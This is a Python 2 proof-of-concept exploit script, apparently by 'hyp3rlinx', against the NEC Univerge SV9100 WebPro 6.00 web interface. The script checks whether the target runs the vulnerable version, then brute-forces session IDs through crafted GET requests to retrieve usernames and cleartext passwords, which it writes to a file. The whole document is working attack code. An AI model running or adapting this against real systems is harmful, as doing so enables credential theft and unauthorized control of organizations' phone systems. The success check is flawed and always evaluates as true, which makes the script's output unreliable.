from socket import *
import re

#Univerge Sv9100 NEC WebPro : 6.00
#Dumps user accounts and plaintext passwords stored in Web UI in Administrator Programming Password Setup' webpage
#http://TARGET-IP/Home.htm?sessionId=12959&GOTO(8) "GOTO(8)" will retrieve all account usernames and cleartext passwords.

print "NEC Univerge Sv9100 WebPro - 6.00.00 / Remote 0day Exploit POC"
print "hyp3rlinx"


IP=raw_input("[+] TARGET> ")
res=''
findme="Programming Password Setup"
cnt=0
tmp=False
tmp2=False
pwned=False

#check application is NEC and vuln version
def is_NEC_webpro(u):
    global tmp,tmp2,cnt
    res=''
    cnt+=1
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((IP,80))
    s.send('GET '+u+' HTTP/1.1\r\nHost: '+IP+'\r\n\r\n')

    while True:
        res=s.recv(4048)
        if res.find('</html>')!=-1:
            break   
    s.close()
    
    if re.findall(r"\bWebPro\b", res):
        tmp=True
        if tmp and cnt < 3:
            is_NEC_webpro('/Login.htm')
            if re.findall(r"\b6.00.00\b", res) and re.findall(r"\bNEC Corporation of America\b", res):
                tmp2 = True
            if tmp == True and tmp2 == True:
                return True
    return False



def dump(acct):
    file=open('NEC-Accounts.txt', 'w')
    file.write(acct+'\n')
    file.close()


def breach(sid):
    global pwned
    try:
        s=socket(AF_INET, SOCK_STREAM)
        s.connect((IP,80))
        sid=str(sid)
        print 'trying sessid '+sid
        s.send('GET /Home.htm?sessionId%3d'+sid+'&GOTO(8)%20HTTP/1.1\r\nHost: '+IP+'\r\n\r\n')
    except Exception as e:
        print str(e)
        
    while True:
        res = s.recv(4096)
        if res.find('</html>')!=-1:
            break
        if re.findall(r"\bProgramming Password Setup\b",res)!=-1: ## We hit an active session.
            dump(res)
            print res
            pwned=True
       
    s.close()
    return pwned


def sessgen():
    for sessid in range(1000,15000): ##test 14109
        if breach(sessid):
            break


if __name__=='__main__':
    if is_NEC_webpro('/'):
        sessgen()
    else:
        print 'Not NEC or version not vuln.'
